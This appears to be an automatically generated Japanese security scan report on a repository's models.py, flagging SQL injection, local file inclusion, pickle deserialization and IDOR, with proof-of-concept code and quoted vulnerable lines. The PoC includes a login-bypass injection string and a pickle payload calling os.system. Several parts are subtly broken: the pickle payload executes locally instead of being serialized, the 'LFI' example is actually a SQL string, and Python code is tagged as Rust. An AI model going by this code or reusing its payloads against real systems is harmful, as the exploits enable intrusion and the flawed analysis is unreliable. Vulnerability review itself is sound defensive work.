# 解析レポート

![中高信頼度](https://img.shields.io/badge/信頼度-中高-orange) **信頼度スコア: 70**

## 脆弱性タイプ

- `SQLI`
- `LFI`
- `RCE`
- `IDOR`

## 解析結果

本リポジトリのmodels.pyでは、ユーザー入力を直接文字列連結でSQLクエリに埋め込んでおり、プレースホルダによるパラメータ化が一切行われていません。これにより、authenticate_user／get_user_by_id／search_documents／AuditLogger.log_action／AuditLogger.get_user_logsでSQLインジェクション（SQLI）が可能です。

また、DocumentModel.get_document_contentではDBから取得したfile_pathを検証せずにopen()でファイル読み込みを行っており、ローカルファイル読み込み（LFI）攻撃が成立します。さらに、update_user_preferencesではpickle.loadsによる任意コード実行（RCE）が可能です。search_documentsにはオーナーチェックがなく、IDORにより他ユーザーの文書情報取得が可能です。

## PoC（概念実証コード）

```text
# SQLインジェクションで認証バイパス
user = "admin' OR '1'='1" 
passw = "hoge"
result = UserModel(db).authenticate_user(user, passw)
print(result)  # 管理者権限取得

# LFIによる任意ファイル読み込み
content = DocumentModel(db).get_document_content("1 OR 1=1")
print(content)  # /etc/passwdなどの読み込みに悪用可能

# 任意コード実行（RCE） via pickle
import os, pickle
payload = pickle.dumps(os.system('id'))
payload_str = payload.decode('latin1')
UserModel(db).update_user_preferences(1, payload_str)

# IDORによる他ユーザー文書取得
docs = DocumentModel(db).search_documents('', 99)
print(docs)

```

## 関連コードコンテキスト

### 関数名: authenticate_user
- 理由: SQLインジェクション：ユーザー入力を直接連結している
- パス: repo/models.py
```rust
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

### 関数名: get_user_by_id
- 理由: SQLインジェクション：IDを検証せずに直接埋め込み
- パス: repo/models.py
```rust
query = f"SELECT * FROM users WHERE id = {user_id}"
```

### 関数名: search_documents
- 理由: SQLインジェクション＋IDOR：入力をエスケープせずLIKE句に埋め込み、オーナーチェックもなし
- パス: repo/models.py
```rust
sql = f"SELECT * FROM documents WHERE title LIKE '%{query}%'
"
```

### 関数名: get_document_content
- 理由: LFI：DBからのfile_pathを検証せずファイルを読み込む
- パス: repo/models.py
```rust
with open(file_path, 'r') as f:
```

### 関数名: update_user_preferences
- 理由: Unsafe deserialization：pickleによる任意コード実行可能
- パス: repo/models.py
```rust
prefs = pickle.loads(preferences.encode('latin1'))
```

### 関数名: log_action
- 理由: SQLインジェクション：ログ用INSERTに直接連結
- パス: repo/models.py
```rust
query = f"""
    INSERT INTO audit_logs (user_id, action, details, ip_address) 
    VALUES ({user_id}, '{action}', '{details}', '{ip_address}')
"""
```

### 関数名: get_user_logs
- 理由: SQLインジェクション：user_idを検証せずに埋め込み
- パス: repo/models.py
```rust
query = f"SELECT * FROM audit_logs WHERE user_id = {user_id} ORDER BY timestamp DESC"
```

### 関数名: search_documents
- 理由: アクセス制御不備（IDOR）：全ユーザーの文書にアクセス可能
- パス: repo/models.py
```rust
# Vulnerable: No authorization check (IDOR)
```

## 解析ノート

各メソッドがユーザー入力を不検証でSQLクエリ／ファイルIO／pickleに直接渡しており、重大な脆弱性（SQLI、LFI、RCE、IDOR）が混在している。

